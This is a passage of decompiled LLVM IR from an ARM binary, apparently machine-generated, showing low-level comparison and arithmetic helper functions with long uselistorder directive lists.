  uselistorder label %bb112, { 1, 0 }
  uselistorder label %dec_label_pc_1835c, { 1, 0 }
  uselistorder label %dec_label_pc_18340, { 1, 0 }
  uselistorder label %bb110, { 1, 0 }
  uselistorder label %dec_label_pc_1830c, { 3, 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb107, { 1, 0 }
  uselistorder label %.thread12, { 2, 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread11, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_181fc, { 1, 0 }
  uselistorder label %dec_label_pc_181e4, { 1, 0 }
  uselistorder label %bb95, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_1838c() local_unnamed_addr {
dec_label_pc_1838c:
  store i32 1, i32* @ip, align 4
  %v0_1838c = load i32, i32* @r0, align 4
  ret i32 %v0_1838c
}

define i32 @function_18390(i32 %arg1) local_unnamed_addr {
dec_label_pc_18390:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_18390 = load i32, i32* @ip, align 4
  %v0_18394 = load i32, i32* @r1, align 4
  %v2_18394 = mul i32 %v0_18394, 2
  %v2_18394.off = add i32 %v2_18394, 4194303
  %tmp = icmp ult i32 %v2_18394.off, 2097152
  %v0_1839c = load i32, i32* @r3, align 4
  %v2_1839c = mul i32 %v0_1839c, 2
  br i1 %tmp, label %dec_label_pc_183ec, label %bb

bb:                                               ; preds = %dec_label_pc_18390
  %v2_1839c.off = add i32 %v2_1839c, 4194303
  %tmp21 = icmp ult i32 %v2_1839c.off, 2097152
  br i1 %tmp21, label %dec_label_pc_183e0, label %dec_label_pc_183a8

dec_label_pc_183a8:                               ; preds = %dec_label_pc_183f4, %dec_label_pc_18400, %bb
  %v0_183a8 = load i32, i32* %r0.global-to-local, align 4
  %v4_183a8 = or i32 %v0_183a8, %v2_18394
  store i32 %v4_183a8, i32* @ip, align 4
  %v6_183a8 = icmp eq i32 %v4_183a8, 0
  br i1 %v6_183a8, label %bb10, label %.thread

bb10:                                             ; preds = %dec_label_pc_183a8
  %v1_183ac = load i32, i32* @r2, align 4
  %v5_183ac = or i32 %v1_183ac, %v2_1839c
  store i32 %v5_183ac, i32* @ip, align 4
  %v7_183ac = icmp eq i32 %v5_183ac, 0
  br i1 %v7_183ac, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_183a8, %bb10
  %v5_183b0 = icmp eq i32 %v0_1839c, %v0_18394
  br i1 %v5_183b0, label %.thread..thread1_crit_edge, label %.thread2

.thread..thread1_crit_edge:                       ; preds = %.thread
  %v2_183b4.pre = load i32, i32* @r2, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread..thread1_crit_edge, %bb10
  %v2_183b4 = phi i32 [ %v2_183b4.pre, %.thread..thread1_crit_edge ], [ %v1_183ac, %bb10 ]
  %v5_183b4 = icmp eq i32 %v2_183b4, %v0_183a8
  br i1 %v5_183b4, label %bb11, label %.thread2

bb11:                                             ; preds = %.thread1
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %.thread, %.thread1, %bb11
  %v1_183bc = phi i1 [ false, %.thread ], [ false, %.thread1 ], [ true, %bb11 ]
  %v0_183bc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_183bc, i32 %v0_183bc)
  %v0_183c0 = load i32, i32* %r0.global-to-local, align 4
  %v0_183c4 = load i32, i32* @r1, align 4
  %v1_183c4 = load i32, i32* @r3, align 4
  %v2_183c4 = xor i32 %v1_183c4, %v0_183c4
  %v3_183c4 = icmp slt i32 %v2_183c4, 0
  br i1 %v3_183c4, label %..thread3_crit_edge, label %bb12

bb12:                                             ; preds = %.thread2
  %v10_183c8 = icmp eq i32 %v0_183c4, %v1_183c4
  br i1 %v10_183c8, label %bb13, label %bb14

bb13:                                             ; preds = %bb12
  %v2_183cc = load i32, i32* @r2, align 4
  %v4_183cc = icmp ult i32 %v0_183c0, %v2_183cc
  br i1 %v4_183cc, label %..thread3_crit_edge, label %bb15

bb14:                                             ; preds = %bb12
  %v4_183c8 = icmp ult i32 %v0_183c4, %v1_183c4
  br i1 %v4_183c8, label %..thread3_crit_edge, label %bb15

..thread3_crit_edge:                              ; preds = %bb13, %bb14, %.thread2
  %.pre8 = ashr i32 %v1_183c4, 31
  br label %.thread3

bb15:                                             ; preds = %bb13, %bb14
  %v2_183d0 = and i32 %v1_183c4, 1073741824
  %v3_183d0 = icmp eq i32 %v2_183d0, 0
  %v4_183d0 = ashr i32 %v1_183c4, 31
  br i1 %v3_183d0, label %.thread3, label %bb16

.thread3:                                         ; preds = %bb15, %..thread3_crit_edge
  %v4_183d4.pre-phi = phi i32 [ %.pre8, %..thread3_crit_edge ], [ %v4_183d0, %bb15 ]
  %v5_183d4 = sub nsw i32 -1, %v4_183d4.pre-phi
  br label %bb16

bb16:                                             ; preds = %bb15, %.thread3
  %v0_183d8 = phi i32 [ %v5_183d4, %.thread3 ], [ %v4_183d0, %bb15 ]
  %v1_183d8 = or i32 %v0_183d8, 1
  store i32 %v1_183d8, i32* %r0.global-to-local, align 4
  ret i32 %v1_183d8

dec_label_pc_183e0:                               ; preds = %bb
  br label %dec_label_pc_183f4

dec_label_pc_183ec:                               ; preds = %dec_label_pc_18390
  %v0_183ec = load i32, i32* %r0.global-to-local, align 4
  %v4_183ec = mul i32 %v0_18394, 4096
  %v5_183ec = or i32 %v0_183ec, %v4_183ec
  store i32 %v5_183ec, i32* @ip, align 4
  %v7_183ec = icmp eq i32 %v5_183ec, 0
  br i1 %v7_183ec, label %dec_label_pc_183ec.dec_label_pc_183f4_crit_edge, label %dec_label_pc_18408

dec_label_pc_183ec.dec_label_pc_183f4_crit_edge:  ; preds = %dec_label_pc_183ec
  %v2_1839c.off20 = add i32 %v2_1839c, 4194303
  %tmp22 = icmp ult i32 %v2_1839c.off20, 2097152
  br label %dec_label_pc_183f4

dec_label_pc_183f4:                               ; preds = %dec_label_pc_183ec.dec_label_pc_183f4_crit_edge, %dec_label_pc_183e0
  %v3_183f8.pre-phi = phi i1 [ %tmp22, %dec_label_pc_183ec.dec_label_pc_183f4_crit_edge ], [ true, %dec_label_pc_183e0 ]
  br i1 %v3_183f8.pre-phi, label %dec_label_pc_18400, label %dec_label_pc_183a8

dec_label_pc_18400:                               ; preds = %dec_label_pc_183f4
  %v0_18400 = load i32, i32* @r2, align 4
  %v4_18400 = mul i32 %v0_1839c, 4096
  %v5_18400 = or i32 %v0_18400, %v4_18400
  store i32 %v5_18400, i32* @ip, align 4
  %v7_18400 = icmp eq i32 %v5_18400, 0
  br i1 %v7_18400, label %dec_label_pc_183a8, label %dec_label_pc_18408

dec_label_pc_18408:                               ; preds = %dec_label_pc_183ec, %dec_label_pc_18400
  store i32 %v0_18390, i32* %r0.global-to-local, align 4
  ret i32 %v0_18390

; uselistorder directives
  uselistorder i32 %v1_183c4, { 2, 3, 1, 5, 4, 0 }
  uselistorder i32 %v0_183c4, { 2, 1, 0 }
  uselistorder i32 %v1_183ac, { 1, 0 }
  uselistorder i32 %v2_1839c, { 0, 2, 1 }
  uselistorder i32 %v0_1839c, { 1, 0, 2 }
  uselistorder i32 %v2_18394, { 1, 0 }
  uselistorder i32 %v0_18394, { 1, 0, 2 }
  uselistorder i32 %v0_18390, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 4, 5, 6, 1, 2 }
  uselistorder i32 1073741824, { 1, 2, 0, 3 }
  uselistorder i32 31, { 9, 4, 2, 5, 6, 10, 3, 11, 7, 8, 1, 13, 0, 14, 15, 16, 17, 12 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 0, 1, 2, 3, 4, 35, 36, 37, 38, 39, 40, 41, 42, 43, 14, 15, 16, 17, 18, 20, 44, 7, 57, 47, 45, 8, 13, 62, 67, 65, 66, 64, 58, 59, 5, 11, 12, 60, 61, 63, 48, 49, 19, 51, 52, 9, 46, 6, 50, 53, 54, 55, 10, 56 }
  uselistorder i32* @r3, { 61, 62, 10, 63, 64, 65, 11, 12, 66, 67, 9, 68, 69, 70, 71, 72, 73, 74, 75, 76, 35, 36, 38, 39, 40, 41, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 57, 3, 56, 8, 14, 37, 15, 16, 44, 58, 59, 112, 113, 114, 115, 116, 117, 118, 5, 119, 120, 121, 6, 122, 123, 124, 7, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 0, 143, 144, 145, 146, 4, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 13, 147, 148, 149, 150, 154, 155, 156, 153, 42, 43, 94, 95, 96, 89, 107, 108, 17, 18, 19, 160, 157, 158, 159, 2, 161, 162, 163, 90, 91, 100, 20, 101, 102, 103, 104, 25, 92, 26, 93, 105, 151, 97, 98, 99, 152, 109, 110, 111, 1, 21, 22, 23, 24, 27, 28, 29, 30, 31, 32, 33, 34, 60, 106 }
  uselistorder i32* @r1, { 112, 113, 19, 114, 115, 116, 117, 118, 119, 18, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 23, 24, 25, 26, 27, 131, 1, 132, 133, 134, 135, 136, 137, 138, 11, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 28, 57, 58, 59, 63, 17, 20, 64, 65, 66, 67, 68, 69, 73, 74, 75, 76, 77, 80, 81, 82, 83, 84, 85, 86, 87, 8, 29, 30, 32, 31, 88, 89, 182, 150, 34, 35, 78, 79, 2, 61, 90, 91, 97, 98, 60, 38, 3, 183, 151, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 14, 62, 0, 33, 36, 16, 194, 37, 195, 196, 70, 71, 72, 52, 4, 184, 5, 99, 100, 185, 186, 187, 169, 170, 171, 15, 92, 93, 94, 95, 96, 6, 101, 102, 9, 103, 104, 105, 7, 21, 172, 173, 174, 175, 176, 10, 177, 178, 179, 22, 188, 189, 180, 48, 181, 12, 152, 13, 192, 193, 39, 40, 41, 42, 43, 44, 45, 46, 47, 49, 50, 51, 53, 54, 55, 56, 106, 107, 108, 109, 110, 111, 190, 191 }
  uselistorder i32* @ip, { 99, 100, 101, 102, 103, 104, 13, 14, 105, 106, 107, 108, 109, 110, 15, 111, 112, 113, 114, 115, 116, 117, 118, 25, 26, 27, 28, 29, 35, 36, 38, 39, 40, 41, 42, 43, 44, 45, 53, 61, 60, 62, 63, 64, 65, 66, 67, 68, 69, 70, 72, 73, 71, 74, 8, 75, 9, 76, 77, 78, 79, 119, 120, 0, 121, 16, 54, 55, 56, 57, 58, 59, 37, 80, 81, 82, 96, 166, 32, 33, 12, 123, 122, 4, 124, 125, 5, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 10, 200, 201, 202, 203, 204, 205, 206, 207, 208, 34, 126, 127, 128, 129, 130, 209, 210, 22, 46, 47, 1, 48, 49, 50, 51, 52, 165, 153, 11, 154, 155, 97, 156, 157, 131, 30, 31, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 133, 132, 6, 214, 211, 212, 213, 7, 215, 158, 159, 2, 160, 18, 3, 19, 135, 136, 137, 138, 139, 140, 141, 142, 134, 143, 144, 145, 146, 147, 148, 149, 150, 161, 162, 163, 20, 21, 151, 17, 23, 24, 98, 152, 164 }
  uselistorder label %dec_label_pc_18408, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %..thread3_crit_edge, { 1, 0, 2 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_183a8, { 1, 0, 2 }
}

define i32 @function_18410() local_unnamed_addr {
dec_label_pc_18410:
  %v0_18414 = load i32, i32* @r2, align 4
  store i32 %v0_18414, i32* @r0, align 4
  %v0_18428 = call i32 @function_1842c()
  ret i32 %v0_18428

; uselistorder directives
  uselistorder i32* @r2, { 133, 134, 135, 2, 136, 14, 137, 138, 139, 140, 141, 142, 11, 143, 144, 145, 146, 147, 93, 94, 98, 13, 100, 101, 102, 103, 104, 109, 110, 111, 112, 113, 114, 115, 16, 116, 117, 118, 148, 149, 17, 99, 107, 108, 3, 97, 119, 120, 121, 15, 18, 9, 184, 185, 186, 150, 151, 152, 153, 154, 155, 156, 157, 95, 96, 187, 188, 189, 190, 191, 194, 195, 196, 197, 1, 200, 192, 105, 106, 193, 4, 5, 6, 176, 158, 159, 160, 161, 19, 10, 122, 8, 0, 198, 7, 199, 162, 163, 164, 166, 165, 167, 168, 169, 170, 177, 178, 179, 171, 30, 172, 180, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 32, 33, 34, 35, 36, 12, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 123, 124, 125, 126, 127, 128, 129, 130, 131, 174, 175, 181, 182, 183, 132, 173 }
}

define i32 @function_1842c() local_unnamed_addr {
dec_label_pc_1842c:
  %stack_var_-8 = alloca i32, align 4
  %v3_1842c = load i32, i32* @r0, align 4
  store i32 %v3_1842c, i32* %stack_var_-8, align 4
  %v0_18430 = call i32 @function_1838c()
  store i1 true, i1* @cpsr_c, align 1
  %v1_18434 = icmp slt i32 %v0_18430, 0
  %v2_18434 = icmp eq i32 %v0_18430, 0
  store i1 %v2_18434, i1* @cpsr_z, align 1
  br i1 %v1_18434, label %bb, label %bb3

bb:                                               ; preds = %dec_label_pc_1842c
  store i1 false, i1* @cpsr_c, align 1
  store i1 false, i1* @cpsr_z, align 1
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_1842c, %bb
  %v2_1843c = load i32, i32* %stack_var_-8, align 4
  ret i32 %v2_1843c

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @function_18444(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_18444:
  %v0_18448 = call i32 @function_1842c()
  %v0_1844c = load i1, i1* @cpsr_z, align 1
  %.v0_18448. = zext i1 %v0_1844c to i32
  ret i32 %.v0_18448.
}

define i32 @function_1845c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1845c:
  %v0_18460 = call i32 @function_1842c()
  %v0_18464 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_18464 to i32
  %.v0_18460. = xor i32 %tmp2, 1
  ret i32 %.v0_18460.
}

define i32 @function_18474() local_unnamed_addr {
dec_label_pc_18474:
  %v0_18478 = call i32 @function_1842c()
  %v0_1847c = load i1, i1* @cpsr_z, align 1
  %v1_1847c = load i1, i1* @cpsr_c, align 1
  %v2_1847c = xor i1 %v1_1847c, true
  %v3_1847c = or i1 %v0_1847c, %v2_1847c
  %.v0_18478 = select i1 %v3_1847c, i32 1, i32 %v0_18478
  %v2_18480 = xor i1 %v0_1847c, true
  %v3_18480 = and i1 %v1_1847c, %v2_18480
  %..v0_18478 = select i1 %v3_18480, i32 0, i32 %.v0_18478
  ret i32 %..v0_18478

; uselistorder directives
  uselistorder i1 %v1_1847c, { 1, 0 }
  uselistorder i32 ()* @function_1842c, { 2, 1, 0, 3 }
}

define i32 @function_1848c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1848c:
  %stack_var_-8 = alloca i32, align 4
  %v0_1848c = load i32, i32* @lr, align 4
  store i32 %v0_1848c, i32* %stack_var_-8, align 4
  %v0_18490 = call i32 @function_18410()
  %v0_18494 = load i1, i1* @cpsr_z, align 1
  %v1_18494 = load i1, i1* @cpsr_c, align 1
  %v2_18494 = xor i1 %v1_18494, true
  %v3_18494 = or i1 %v0_18494, %v2_18494
  %.v0_18490 = select i1 %v3_18494, i32 1, i32 %v0_18490
  %v2_18498 = xor i1 %v0_18494, true
  %v3_18498 = and i1 %v1_18494, %v2_18498
  %..v0_18490 = select i1 %v3_18498, i32 0, i32 %.v0_18490
  %v2_1849c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1849c, i32* @lr, align 4
  ret i32 %..v0_18490

; uselistorder directives
  uselistorder i1 %v1_18494, { 1, 0 }
  uselistorder i1 true, { 2, 3, 4, 5, 97, 0, 87, 6, 7, 8, 9, 10, 11, 79, 80, 88, 89, 81, 12, 13, 14, 82, 83, 84, 90, 16, 15, 98, 99, 100, 101, 102, 103, 104, 85, 105, 106, 107, 92, 108, 109, 110, 111, 86, 112, 113, 114, 115, 116, 117, 118, 17, 119, 96, 120, 18, 19, 20, 21, 22, 23, 93, 26, 27, 28, 29, 24, 25, 94, 30, 31, 95, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 121, 122, 123, 124, 57, 58, 91, 125, 59, 126, 60, 61, 1, 62, 63, 77, 64, 65, 66, 67, 78, 68, 69, 70, 71, 72, 73, 74, 75, 76 }
  uselistorder i1* @cpsr_z, { 34, 0, 35, 36, 37, 38, 39, 40, 41, 42, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 48, 12, 13, 14, 15, 16, 17, 18, 19, 44, 45, 46, 47, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 43 }
  uselistorder i32* @lr, { 100, 101, 102, 103, 104, 105, 106, 107, 5, 6, 7, 8, 108, 0, 109, 1, 110, 111, 112, 113, 114, 115, 41, 42, 46, 47, 48, 52, 53, 54, 56, 57, 58, 59, 60, 62, 4, 67, 66, 68, 69, 70, 71, 72, 73, 74, 75, 9, 10, 76, 77, 78, 86, 79, 80, 81, 82, 83, 84, 85, 116, 55, 11, 12, 63, 64, 65, 49, 50, 51, 19, 168, 169, 170, 171, 172, 173, 174, 175, 176, 139, 140, 43, 44, 45, 117, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 40, 13, 14, 22, 23, 24, 34, 35, 61, 36, 37, 38, 15, 16, 164, 177, 178, 17, 18, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 2, 154, 155, 157, 158, 156, 87, 88, 89, 90, 91, 159, 160, 161, 130, 131, 132, 133, 3, 134, 135, 136, 137, 25, 26, 27, 28, 29, 30, 31, 162, 163, 32, 118, 119, 165, 166, 167, 20, 21, 33, 39, 92, 93, 94, 95, 96, 97, 98, 99, 138 }
}

define i32 @function_184a4() local_unnamed_addr {
dec_label_pc_184a4:
  %v0_184a8 = call i32 @function_18410()
  %v0_184ac = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_184ac to i32
  %.v0_184a8. = xor i32 %tmp2, 1
  ret i32 %.v0_184a8.

; uselistorder directives
  uselistorder i32 1, { 550, 562, 656, 563, 551, 657, 1182, 239, 1183, 940, 1184, 658, 360, 363, 362, 365, 361, 366, 367, 364, 1185, 659, 1186, 660, 14, 15, 12, 13, 377, 378, 379, 514, 169, 661, 451, 452, 1187, 1188, 301, 300, 1189, 380, 381, 382, 662, 449, 450, 1042, 570, 1043, 1044, 663, 316, 317, 318, 314, 319, 320, 315, 664, 168, 167, 1045, 571, 572, 1048, 1062, 667, 666, 665, 446, 448, 445, 447, 1064, 668, 321, 322, 1065, 515, 1066, 1067, 669, 55, 56, 260, 259, 289, 670, 287, 286, 1068, 672, 671, 265, 264, 263, 673, 224, 674, 271, 573, 1069, 1070, 1071, 491, 1072, 556, 516, 1073, 1074, 493, 1075, 1076, 677, 676, 675, 401, 400, 402, 399, 1077, 1078, 1079, 1085, 1086, 1087, 1094, 574, 575, 652, 684, 683, 653, 682, 681, 680, 679, 678, 394, 396, 397, 395, 552, 1097, 1098, 543, 1099, 1101, 468, 1103, 577, 538, 537, 576, 1104, 486, 501, 536, 557, 1105, 1106, 1107, 1108, 1109, 0, 1110, 1100, 578, 1111, 547, 692, 643, 691, 690, 689, 688, 687, 686, 685, 184, 183, 182, 185, 1112, 1113, 1114, 1115, 1116, 469, 1117, 693, 252, 254, 251, 249, 248, 250, 253, 255, 941, 942, 943, 944, 945, 946, 947, 948, 517, 949, 950, 697, 696, 695, 694, 196, 197, 198, 199, 951, 952, 953, 954, 955, 700, 699, 698, 219, 215, 216, 221, 218, 217, 223, 222, 220, 518, 1118, 519, 1119, 1120, 1121, 1122, 1, 1123, 1124, 1125, 1126, 1127, 1128, 654, 701, 115, 114, 117, 118, 113, 119, 116, 564, 1129, 1130, 1131, 1132, 1133, 702, 209, 208, 210, 211, 212, 1253, 703, 384, 385, 386, 704, 207, 705, 85, 86, 88, 87, 706, 59, 58, 57, 1190, 1191, 1192, 707, 442, 444, 443, 440, 441, 708, 46, 47, 44, 50, 48, 45, 49, 229, 709, 409, 414, 408, 413, 417, 416, 412, 415, 410, 411, 710, 353, 711, 270, 269, 1088, 579, 1089, 1090, 1091, 1092, 1093, 712, 52, 53, 51, 54, 228, 227, 520, 1134, 1135, 1154, 1155, 714, 713, 16, 18, 19, 17, 494, 544, 495, 1156, 1157, 1158, 1159, 521, 715, 35, 969, 970, 33, 34, 502, 1321, 503, 1049, 1322, 1050, 1051, 1052, 504, 971, 1054, 1053, 484, 716, 972, 717, 404, 405, 406, 403, 1193, 505, 1194, 1096, 1095, 1323, 506, 1324, 1325, 1326, 1327, 1328, 1329, 938, 1330, 1331, 1332, 1333, 1334, 1335, 939, 644, 719, 718, 303, 304, 306, 308, 307, 305, 302, 311, 309, 310, 580, 1254, 1255, 1256, 1257, 720, 645, 153, 152, 1055, 1056, 721, 202, 201, 507, 522, 1195, 1196, 1199, 581, 1200, 492, 523, 487, 508, 1201, 582, 1202, 1203, 1204, 2, 1205, 477, 1206, 470, 1207, 583, 1208, 1209, 1210, 524, 1211, 734, 733, 732, 731, 730, 729, 728, 727, 726, 725, 724, 723, 646, 722, 124, 131, 123, 125, 132, 121, 122, 127, 126, 134, 135, 129, 128, 130, 133, 1212, 1213, 335, 333, 338, 336, 337, 334, 339, 299, 488, 735, 159, 160, 736, 368, 1258, 1259, 1260, 737, 174, 175, 177, 176, 179, 180, 178, 181, 245, 1214, 739, 738, 107, 109, 108, 110, 111, 112, 525, 558, 742, 741, 740, 584, 1063, 743, 230, 1057, 1058, 1059, 1060, 1061, 585, 744, 92, 95, 93, 96, 94, 586, 97, 956, 745, 350, 587, 746, 340, 553, 588, 747, 258, 256, 257, 748, 268, 267, 266, 749, 332, 312, 750, 275, 274, 751, 327, 752, 330, 329, 214, 213, 296, 295, 753, 754, 293, 294, 755, 247, 246, 756, 226, 225, 757, 200, 758, 383, 759, 277, 276, 760, 393, 761, 233, 762, 281, 282, 1336, 589, 1337, 590, 1338, 763, 65, 60, 66, 63, 61, 67, 64, 68, 62, 331, 591, 284, 283, 764, 375, 376, 69, 997, 998, 767, 766, 765, 348, 261, 489, 957, 958, 959, 768, 1022, 771, 770, 769, 359, 772, 496, 1080, 497, 1081, 1082, 490, 1083, 462, 463, 461, 464, 465, 467, 466, 1084, 498, 960, 20, 23, 22, 21, 24, 1024, 526, 527, 1025, 774, 773, 28, 26, 25, 29, 30, 27, 775, 102, 104, 100, 98, 99, 101, 103, 776, 120, 777, 778, 164, 165, 779, 166, 780, 1339, 528, 559, 782, 781, 783, 272, 1261, 1264, 1265, 1266, 784, 453, 458, 459, 457, 456, 460, 454, 455, 1267, 1268, 1269, 1270, 785, 425, 431, 424, 430, 429, 423, 433, 432, 427, 421, 426, 422, 428, 1262, 1263, 592, 343, 342, 341, 344, 1271, 1272, 1273, 1274, 1275, 1276, 554, 1277, 1278, 1279, 1280, 1281, 1282, 1283, 1284, 594, 1285, 1286, 1287, 1288, 1289, 593, 1290, 1291, 1292, 1293, 1294, 786, 140, 142, 138, 141, 145, 147, 144, 146, 148, 143, 149, 139, 137, 136, 787, 292, 291, 285, 788, 313, 789, 349, 790, 355, 354, 791, 298, 792, 347, 346, 793, 328, 794, 795, 1030, 1031, 1032, 478, 479, 1033, 797, 796, 420, 419, 1295, 798, 1102, 799, 297, 1215, 1216, 800, 407, 1046, 1047, 1136, 1137, 1138, 1139, 1140, 1141, 1142, 1143, 1144, 1145, 1146, 1147, 1148, 1149, 1150, 1151, 1152, 1153, 801, 242, 240, 241, 243, 244, 1160, 1161, 36, 1162, 1163, 3, 1164, 4, 529, 5, 530, 6, 531, 1165, 1166, 7, 105, 106, 509, 1217, 1317, 1318, 961, 962, 963, 964, 965, 966, 967, 1340, 323, 324, 325, 326, 161, 595, 802, 596, 1167, 1168, 1169, 803, 647, 157, 158, 154, 155, 156, 1299, 1296, 1297, 1298, 539, 510, 190, 186, 187, 188, 189, 1300, 804, 191, 193, 194, 195, 192, 597, 1301, 806, 805, 371, 374, 372, 369, 370, 373, 1170, 1171, 807, 203, 206, 204, 205, 1302, 808, 280, 279, 278, 999, 809, 172, 171, 173, 170, 548, 1218, 1219, 599, 1220, 1221, 1222, 1223, 1224, 600, 1225, 1226, 1227, 1228, 1229, 601, 1231, 533, 532, 1230, 598, 1232, 1233, 602, 1234, 1235, 1236, 814, 655, 813, 812, 811, 810, 73, 71, 72, 75, 78, 70, 80, 76, 79, 77, 74, 1237, 815, 388, 391, 390, 392, 387, 389, 511, 816, 150, 151, 1238, 1239, 1240, 81, 82, 83, 84, 549, 480, 1242, 1243, 499, 1244, 1245, 8, 9, 1246, 1248, 485, 1249, 604, 1250, 500, 1247, 603, 826, 825, 824, 823, 822, 821, 820, 819, 818, 817, 89, 90, 91, 605, 512, 827, 356, 357, 358, 1241, 560, 648, 828, 418, 606, 968, 37, 38, 1303, 1304, 1305, 1306, 1307, 1308, 1309, 1310, 513, 831, 830, 829, 435, 434, 438, 437, 436, 439, 607, 545, 546, 1000, 835, 834, 833, 832, 39, 42, 41, 43, 40, 836, 273, 534, 838, 837, 839, 1311, 1312, 1313, 841, 840, 31, 32, 842, 238, 237, 843, 288, 844, 352, 351, 845, 235, 234, 846, 290, 236, 847, 232, 231, 848, 1197, 471, 1198, 472, 1319, 398, 973, 974, 975, 976, 977, 978, 611, 979, 980, 481, 609, 610, 981, 612, 982, 613, 983, 608, 984, 855, 854, 853, 852, 851, 850, 849, 262, 617, 614, 615, 616, 618, 619, 859, 858, 857, 856, 985, 986, 860, 861, 987, 988, 989, 990, 991, 992, 993, 994, 995, 996, 862, 649, 863, 864, 162, 1001, 473, 482, 1002, 1003, 1004, 1005, 474, 1006, 1007, 1008, 1009, 1010, 620, 1011, 1018, 1019, 1020, 868, 867, 866, 865, 345, 869, 1021, 870, 871, 621, 622, 873, 872, 1023, 623, 624, 625, 626, 876, 875, 874, 1026, 627, 628, 629, 883, 650, 882, 881, 880, 879, 878, 877, 1027, 1028, 630, 631, 892, 891, 890, 651, 889, 888, 887, 886, 885, 884, 1029, 555, 632, 633, 897, 896, 895, 894, 893, 899, 898, 565, 1034, 475, 476, 1035, 1036, 1037, 904, 903, 902, 901, 900, 1038, 905, 1039, 906, 1040, 908, 907, 909, 1041, 910, 1172, 1173, 634, 1174, 1175, 1176, 635, 10, 1177, 636, 1178, 637, 918, 917, 916, 915, 914, 913, 912, 911, 163, 541, 483, 638, 540, 919, 561, 1179, 920, 639, 1251, 640, 1252, 641, 642, 929, 928, 927, 926, 925, 924, 923, 922, 921, 1314, 1315, 1316, 931, 930, 932, 542, 1320, 535, 1180, 11, 1181, 933, 935, 934, 567, 1012, 1013, 566, 1014, 1015, 568, 569, 1016, 1017, 936, 937 }
  uselistorder i1 false, { 31, 34, 13, 14, 11, 15, 47, 48, 49, 50, 51, 52, 8, 9, 12, 53, 10, 35, 32, 36, 37, 38, 39, 40, 3, 16, 17, 33, 1, 29, 54, 0, 21, 22, 23, 41, 18, 20, 42, 43, 44, 45, 46, 30, 2, 4, 55, 19, 24, 5, 27, 26, 25, 28, 6, 7, 56, 57, 58, 59 }
  uselistorder i1* @cpsr_c, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 ()* @function_18410, { 1, 0 }
}

define i32 @function_184bc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_184bc:
  %v1_184bc = icmp slt i32 %arg2, 0
  %v2_184bc = mul i32 %arg2, 2
  br i1 %v1_184bc, label %dec_label_pc_184f0, label %dec_label_pc_184c4

dec_label_pc_184c4:                               ; preds = %dec_label_pc_184bc
  %v1_184c4 = add i32 %v2_184bc, 2097152
  %v2_184c4 = icmp ugt i32 %v2_184bc, -2097153
  br i1 %v2_184c4, label %dec_label_pc_184f8, label %dec_label_pc_184cc

dec_label_pc_184cc:                               ; preds = %dec_label_pc_184c4
  %v6_184c4 = icmp slt i32 %v1_184c4, 0
  br i1 %v6_184c4, label %dec_label_pc_184d0, label %dec_label_pc_184f0

dec_label_pc_184d0:                               ; preds = %dec_label_pc_184cc
  %v4_184d4 = sdiv i32 %v1_184c4, 2097152
  %v5_184d4 = sub nsw i32 -993, %v4_184d4
  %v11_184d4 = icmp slt i32 %v5_184d4, 0
  br i1 %v11_184d4, label %dec_label_pc_18500, label %dec_label_pc_184dc

dec_label_pc_184dc:                               ; preds = %dec_label_pc_184d0
